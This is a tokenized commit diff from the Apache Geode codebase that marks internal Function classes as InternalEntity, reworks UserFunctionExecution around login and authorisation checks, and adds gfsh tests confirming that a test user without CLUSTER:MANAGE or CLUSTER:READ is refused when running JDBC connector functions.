"ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForAlterConnectionFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "alterConnectionFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "MANAGE", "\"", ").", "statusIsError", "(", ");", "functionStringMap", ".", "put", "(", "new", "AlterConnectionFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "AlterMappingFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "CreateConnectionFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "CreateMappingFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "DescribeConnectionFunction", "(", "),", "\"", "CLUSTER", ":", "READ", "\"", ");", "functionStringMap", ".", "put", "(", "new", "DescribeMappingFunction", "(", "),", "\"", "CLUSTER", ":", "READ", "\"", ");", "functionStringMap", ".", "put", "(", "new", "DestroyConnectionFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "DestroyMappingFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "ListConnectionFunction", "(", "),", "\"", "CLUSTER", ":", "READ", "\"", ");", "functionStringMap", ".", "put", "(", "new", "ListMappingFunction", "(", "),", "\"", "CLUSTER", ":", "READ", "\"", ");", "functionStringMap", ".", "put", "(", "new", "InheritsDefaultPermissionsJDBCFunction", "(", "),", "\"", "CLUSTER", ":", "READ", "\"", ");", "functionStringMap", ".", "keySet", "(", ").", "forEach", "(", "FunctionService", ":", ":", "registerFunction", ")", ";", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForAlterMappingFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "alterMappingFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "MANAGE", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForCreateConnectionFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "createConnectionFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "MANAGE", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForCreateMappingFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "createMappingFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "MANAGE", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForDescribeConnectionFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "describeConnectionFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "READ", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForDescribeMappingFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "describeMappingFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "READ", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForDestroyConnectionFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "destroyConnectionFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "MANAGE", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForDestroyMappingFunction", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "destroyMappingFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "MANAGE", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForFunctionInheritingDefaultPermissions", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "inheritsDefaultPermissionsFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "CLUSTER", ":", "READ", "\"", ").", "statusIsError", "(", ");", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "user", "\"", ",", "password", "=", "\"", "user", "\"", ")", "public", "void", "functionRequireExpectedPermission", "(", ")", "throws", "Exception", "{", "functionStringMap", ".", "entrySet", "(", ").", "stream", "(", ").", "forEach", "(", "entry", "-", ">", "{", "Function", "function", "=", "entry", ".", "getKey", "(", ");", "String", "permission", "=", "entry", ".", "getValue", "(", ");", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "function", ".", "getId", "(", "))", ".", "tableHasRowCount", "(", "\"", "Function", "Execution", "Result", "\"", ",", "1", ")", ".", "tableHasColumnWithValuesContaining", "(", "\"", "Function", "Execution", "Result", "\"", ",", "permission", ")", ".", "statusIsError", "(", ");", "}", ");", "}", "}", "@", "@", "-", "16", ",", "7", "+", "16", ",", "6", "@", "@", "import", "java", ".", "io", ".", "Serializable", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "LinkedList", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "concurrent", ".", "TimeUnit", ";", "@", "@", "-", "27", ",", "9", "+", "26", ",", "9", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionService", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "ResultCollector", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "DistributedMember", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "DistributedSystem", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "InternalDistributedSystem", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "membership", ".", "InternalDistributedMember", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "InternalEntity", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "execute", ".", "AbstractExecution", ";", "/", "**", "@", "@", "-", "104", ",", "7", "+", "103", ",", "7", "@", "@", "public", "void", "clearResults", "(", ")", "{", "return", "detector", ".", "getDependencyGraph", "(", ");", "}", "private", "static", "class", "CollectDependencyFunction", "implements", "Function", "{", "private", "static", "class", "CollectDependencyFunction", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "long", "serialVersionUID", "=", "6204378622627095817L", ";", "@", "@", "-", "215", ",", "10", "+", "215", ",", "9", "@", "@", "protected", "void", "process", "(", "final", "ClusterDistributionManager", "dm", ")", "{", "rex", "=", "new", "ReplyException", "(", "thr", ")", ";", "replyWithException", "(", "dm", ",", "rex", ")", ";", "}", "catch", "(", "Exception", "exception", ")", "{", "if", "(", "logger", ".", "isDebugEnabled", "(", "))", "{", "logger", ".", "debug", "(", "\"", "Exception", "occurred", "on", "remote", "member", "while", "executing", "Function", ":", "{", "}\"", ",", "this", ".", "functionObject", ".", "getId", "(", "),", "exception", ")", ";", "}", "logger", ".", "error", "(", "\"", "Exception", "occurred", "on", "remote", "member", "while", "executing", "Function", ":", "{", "}\"", ",", "this", ".", "functionObject", ".", "getId", "(", "),", "exception", ")", ";", "stats", ".", "endFunctionExecutionWithException", "(", "this", ".", "functionObject", ".", "hasResult", "(", "))", ";", "rex", "=", "new", "ReplyException", "(", "exception", ")", ";", "replyWithException", "(", "dm", ",", "rex", ")", ";", "@", "@", "-", "30", ",", "7", "+", "30", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "ResultSender", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "snapshot", ".", "SnapshotOptions", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "DistributedMember", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "GemFireCacheImpl", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "InternalEntity", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "snapshot", ".", "RegionSnapshotServiceImpl", ".", "ExportSink", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "snapshot", ".", "RegionSnapshotServiceImpl", ".", "Exporter", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "snapshot", ".", "RegionSnapshotServiceImpl", ".", "ResultSenderSink", ";", "@", "@", "-", "118", ",", "7", "+", "118", ",", "7", "@", "@", "public", "boolean", "isPRSingleHop", "(", ")", "{", "*", "@", "param", "<", "K", ">", "the", "key", "type", "*", "@", "param", "<", "V", ">", "the", "value", "type", "*", "/", "static", "class", "ProxyExportFunction", "<", "K", ",", "V", ">", "implements", "Function", "{", "static", "class", "ProxyExportFunction", "<", "K", ",", "V", ">", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "@", "Override", "@", "@", "-", "49", ",", "6", "+", "49", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "DistributionConfig", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "InternalDistributedSystem", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "DSCODE", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "InternalEntity", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "CachePerfStats", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "CachedDeserializable", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "CachedDeserializableFactory", ";", "@", "@", "-", "501", ",", "7", "+", "502", ",", "7", "@", "@", "public", "SnapshotFormat", "getFormat", "(", ")", "{", "}", "}", "private", "static", "class", "ParallelExportFunction", "<", "K", ",", "V", ">", "implements", "Function", "{", "private", "static", "class", "ParallelExportFunction", "<", "K", ",", "V", ">", "implements", "Function", ",", "InternalEntity", "{", "@", "Override", "public", "boolean", "hasResult", "(", ")", "{", "return", "true", ";", "@", "@", "-", "544", ",", "7", "+", "545", ",", "7", "@", "@", "public", "boolean", "isHA", "(", ")", "{", "}", "}", "private", "static", "class", "ParallelImportFunction", "<", "K", ",", "V", ">", "implements", "Function", "{", "private", "static", "class", "ParallelImportFunction", "<", "K", ",", "V", ">", "implements", "Function", ",", "InternalEntity", "{", "@", "Override", "public", "boolean", "hasResult", "(", ")", "{", "return", "true", ";", "@", "@", "-", "32", ",", "12", "+", "32", ",", "19", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "EntryDestroyedException", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "*;", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionException", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionService", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "RegionFunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "ResultCollector", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "ResultSender", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "partition", ".", "PartitionRegionHelper", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "snapshot", ".", "SnapshotOptions", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "DistributedMember", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "DistributionConfig", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "ReplyProcessor21", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "InternalEntity", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "LocalRegion", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "execute", ".", "InternalExecution", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "execute", ".", "LocalResultCollector", ";", "@", "@", "-", "150", ",", "7", "+", "157", ",", "7", "@", "@", "public", "DistributedMember", "getExporter", "(", ")", "{", "*", "*", "@", "see", "FlowController", "*", "/", "private", "static", "class", "WindowedExportFunction", "<", "K", ",", "V", ">", "implements", "Function", "{", "private", "static", "class", "WindowedExportFunction", "<", "K", ",", "V", ">", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "/", "/", "We", "must", "keep", "a", "ref", "here", "since", "the", "ProcessorKeeper", "only", "has", "a", "weak", "ref", ".", "If", "@", "@", "-", "34", ",", "7", "+", "34", ",", "6", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "DataPolicy", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionAdapter", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionException", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionService", ";", "@", "@", "-", "70", ",", "7", "+", "69", ",", "7", "@", "@", "*", "DistributedSystemMXBean", ".", "queryData", "(", ")", "*", "/", "@", "SuppressWarnings", "(", "{\"", "deprecation", "\"", ",", "\"", "unchecked", "\"", "})", "public", "class", "QueryDataFunction", "extends", "FunctionAdapter", "implements", "InternalEntity", "{", "public", "class", "QueryDataFunction", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "@", "@", "-", "487", ",", "7", "+", "486", ",", "7", "@", "@", "public", "String", "toString", "(", ")", "{", "/", "**", "*", "Function", "to", "gather", "data", "locally", ".", "This", "function", "is", "required", "to", "execute", "query", "with", "region", "context", "*", "/", "private", "class", "LocalQueryFunction", "extends", "FunctionAdapter", "{", "private", "class", "LocalQueryFunction", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "@", "@", "-", "18", ",", "7", "+", "18", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionAdapter", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "snapshot", ".", "RegionSnapshotService", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "snapshot", ".", "SnapshotOptions", ";", "@", "@", "-", "33", ",", "11", "+", "33", ",", "7", "@", "@", "*", "*", "*", "/", "public", "class", "ExportDataFunction", "extends", "FunctionAdapter", "implements", "InternalEntity", "{", "/", "**", "*", "*", "/", "public", "class", "ExportDataFunction", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "public", "void", "execute", "(", "FunctionContext", "context", ")", "{", "@", "@", "-", "20", ",", "16", "+", "20", ",", "17", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "RegionAttributes", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionAdapter", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "InternalEntity", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "logging", ".", "LogService", ";", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "cli", ".", "i18n", ".", "CliStrings", ";", "/", "**", "*", "*", "@", "since", "GemFire", "7", ".", "0", "*", "/", "public", "class", "FetchRegionAttributesFunction", "extends", "FunctionAdapter", "{", "public", "class", "FetchRegionAttributesFunction", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "Logger", "logger", "=", "LogService", ".", "getLogger", "(", ");", "private", "static", "final", "long", "serialVersionUID", "=", "4366812590788342070L", ";", "@", "@", "-", "18", ",", "7", "+", "18", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionAdapter", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "snapshot", ".", "RegionSnapshotService", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "snapshot", ".", "SnapshotOptions", ";", "@", "@", "-", "31", ",", "7", "+", "31", ",", "7", "@", "@", "*", "RegionSnapshotService", "to", "import", "the", "data", "*", "*", "/", "public", "class", "ImportDataFunction", "extends", "FunctionAdapter", "implements", "InternalEntity", "{", "public", "class", "ImportDataFunction", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "@", "@", "-", "20", ",", "6", "+", "20", ",", "9", "@", "@", "import", "java", ".", "util", ".", "Properties", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "org", ".", "apache", ".", "logging", ".", "log4j", ".", "Logger", ";", "import", "org", ".", "apache", ".", "shiro", ".", "subject", ".", "Subject", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Execution", ";", "@", "@", "-", "31", ",", "138", "+", "34", ",", "151", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "ClassPathLoader", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "InternalEntity", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "logging", ".", "LogService", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "security", ".", "SecurityService", ";", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "cli", ".", "i18n", ".", "CliStrings", ";", "import", "org", ".", "apache", ".", "geode", ".", "security", ".", "AuthenticationRequiredException", ";", "/", "**", "*", "@", "since", "GemFire", "7", ".", "0", "*", "/", "public", "class", "UserFunctionExecution", "implements", "Function", "<", "Object", "[", "]>", ",", "InternalEntity", "{", "public", "static", "final", "String", "ID", "=", "UserFunctionExecution", ".", "class", ".", "getName", "(", ");", "private", "static", "Logger", "logger", "=", "LogService", ".", "getLogger", "(", ");", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "@", "Override", "public", "void", "execute", "(", "FunctionContext", "<", "Object", "[", "]>", "context", ")", "{", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "DistributedMember", "member", "=", "cache", ".", "getDistributedSystem", "(", ").", "getDistributedMember", "(", ");", "try", "{", "String", "[", "]", "functionArgs", "=", "null", ";", "Object", "[", "]", "args", "=", "context", ".", "getArguments", "(", ");", "if", "(", "args", "=", "=", "null", ")", "{", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__COULD_NOT_RETRIEVE_ARGUMENTS", ")", ");", "return", ";", "}", "String", "[", "]", "functionArgs", "=", "null", ";", "Object", "[", "]", "args", "=", "context", ".", "getArguments", "(", ");", "if", "(", "args", "=", "=", "null", ")", "{", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__COULD_NOT_RETRIEVE_ARGUMENTS", ")", ");", "return", ";", "}", "String", "functionId", "=", "(", "(", "String", ")", "args", "[", "0", "]", ");", "String", "filterString", "=", "(", "(", "String", ")", "args", "[", "1", "]", ");", "String", "resultCollectorName", "=", "(", "(", "String", ")", "args", "[", "2", "]", ");", "String", "argumentsString", "=", "(", "(", "String", ")", "args", "[", "3", "]", ");", "String", "onRegion", "=", "(", "(", "String", ")", "args", "[", "4", "]", ");", "Properties", "credentials", "=", "(", "Properties", ")", "args", "[", "5", "]", ";", "String", "functionId", "=", "(", "(", "String", ")", "args", "[", "0", "]", ");", "String", "filterString", "=", "(", "(", "String", ")", "args", "[", "1", "]", ");", "String", "resultCollectorName", "=", "(", "(", "String", ")", "args", "[", "2", "]", ");", "String", "argumentsString", "=", "(", "(", "String", ")", "args", "[", "3", "]", ");", "String", "onRegion", "=", "(", "(", "String", ")", "args", "[", "4", "]", ");", "Properties", "credentials", "=", "(", "Properties", ")", "args", "[", "5", "]", ";", "SecurityService", "securityService", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getSecurityService", "(", ");", "SecurityService", "securityService", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getSecurityService", "(", ");", "boolean", "loginNeeded", "=", "false", ";", "try", "{", "/", "/", "if", "the", "function", "is", "executed", "on", "a", "server", "with", "jmx", "-", "manager", "that", "user", "is", "already", "logged", "into", "/", "/", "then", "we", "do", "not", "need", "to", "do", "login", "/", "logout", "here", ".", "Subject", "subject", "=", "securityService", ".", "getSubject", "(", ");", "loginNeeded", "=", "subject", "=", "=", "null", "|", "|", "!", "subject", ".", "isAuthenticated", "(", ");", "}", "catch", "(", "AuthenticationRequiredException", "e", ")", "{", "loginNeeded", "=", "true", ";", "}", "try", "{", "boolean", "loginSuccessful", "=", "false", ";", "try", "{", "if", "(", "loginNeeded", ")", "{", "securityService", ".", "login", "(", "credentials", ")", ";", "loginSuccessful", "=", "true", ";", "}", "if", "(", "argumentsString", "!", "=", "null", "&", "&", "argumentsString", ".", "length", "(", ")", ">", "0", ")", "{", "functionArgs", "=", "argumentsString", ".", "split", "(", "\",", "\")", ";", "}", "Set", "<", "String", ">", "filters", "=", "new", "HashSet", "<", ">(", ");", "ResultCollector", "resultCollectorInstance", "=", "null", ";", "if", "(", "resultCollectorName", "!", "=", "null", "&", "&", "resultCollectorName", ".", "length", "(", ")", ">", "0", ")", "{", "resultCollectorInstance", "=", "(", "ResultCollector", ")", "ClassPathLoader", ".", "getLatest", "(", ")", ".", "forName", "(", "resultCollectorName", ")", ".", "newInstance", "(", ");", "}", "if", "(", "filterString", "!", "=", "null", "&", "&", "filterString", ".", "length", "(", ")", ">", "0", ")", "{", "filters", ".", "add", "(", "filterString", ")", ";", "}", "if", "(", "argumentsString", "!", "=", "null", "&", "&", "argumentsString", ".", "length", "(", ")", ">", "0", ")", "{", "functionArgs", "=", "argumentsString", ".", "split", "(", "\",", "\")", ";", "}", "Set", "<", "String", ">", "filters", "=", "new", "HashSet", "<", ">(", ");", "ResultCollector", "resultCollectorInstance", "=", "null", ";", "if", "(", "resultCollectorName", "!", "=", "null", "&", "&", "resultCollectorName", ".", "length", "(", ")", ">", "0", ")", "{", "resultCollectorInstance", "=", "(", "ResultCollector", ")", "ClassPathLoader", ".", "getLatest", "(", ")", ".", "forName", "(", "resultCollectorName", ")", ".", "newInstance", "(", ");", "}", "if", "(", "filterString", "!", "=", "null", "&", "&", "filterString", ".", "length", "(", ")", ">", "0", ")", "{", "filters", ".", "add", "(", "filterString", ")", ";", "}", "Function", "<", "?>", "function", "=", "FunctionService", ".", "getFunction", "(", "functionId", ")", ";", "if", "(", "function", "=", "=", "null", ")", "{", "context", ".", "getResultSender", "(", ")", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "(", "CliStrings", ".", "format", "(", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__DOES_NOT_HAVE_FUNCTION_0_REGISTERED", ",", "functionId", ")", "))", ");", "return", ";", "}", "Function", "<", "?>", "function", "=", "FunctionService", ".", "getFunction", "(", "functionId", ")", ";", "if", "(", "function", "=", "=", "null", ")", "{", "context", ".", "getResultSender", "(", ")", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "(", "CliStrings", ".", "format", "(", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__DOES_NOT_HAVE_FUNCTION_0_REGISTERED", ",", "functionId", ")", "))", ");", "return", ";", "}", "/", "/", "security", "check", "function", ".", "getRequiredPermissions", "(", "onRegion", ")", ".", "forEach", "(", "securityService", ":", ":", "authorize", ")", ";", "/", "/", "security", "check", "function", ".", "getRequiredPermissions", "(", "onRegion", ")", ".", "forEach", "(", "securityService", ":", ":", "authorize", ")", ";", "Execution", "execution", "=", "null", ";", "if", "(", "onRegion", "!", "=", "null", "&", "&", "onRegion", ".", "length", "(", ")", ">", "0", ")", "{", "Region", "region", "=", "cache", ".", "getRegion", "(", "onRegion", ")", ";", "if", "(", "region", "=", "=", "null", ")", "{", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "onRegion", "+", "\"", "does", "not", "exist", "\"", "))", ";", "return", ";", "}", "execution", "=", "FunctionService", ".", "onRegion", "(", "region", ")", ";", "}", "else", "{", "execution", "=", "FunctionService", ".", "onMember", "(", "member", ")", ";", "}", "if", "(", "execution", "=", "=", "null", ")", "{", "context", ".", "getResultSender", "(", ")", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "CliStrings", ".", "format", "(", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__ERROR_IN_EXECUTING_0_ON_MEMBER_1_ON_REGION_2_DETAILS_3", ",", "functionId", ",", "member", ".", "getId", "(", "),", "onRegion", ",", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__ERROR_IN_RETRIEVING_EXECUTOR", ")", "))", ";", "Execution", "execution", "=", "null", ";", "if", "(", "onRegion", "!", "=", "null", "&", "&", "onRegion", ".", "length", "(", ")", ">", "0", ")", "{", "Region", "region", "=", "cache", ".", "getRegion", "(", "onRegion", ")", ";", "if", "(", "region", "=", "=", "null", ")", "{", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "onRegion", "+", "\"", "does", "not", "exist", "\"", "))", ";", "return", ";", "}", "execution", "=", "FunctionService", ".", "onRegion", "(", "region", ")", ";", "}", "else", "{", "execution", "=", "FunctionService", ".", "onMember", "(", "member", ")", ";", "}", "if", "(", "resultCollectorInstance", "!", "=", "null", ")", "{", "execution", "=", "execution", ".", "withCollector", "(", "resultCollectorInstance", ")", ";", "}", "if", "(", "execution", "=", "=", "null", ")", "{", "context", ".", 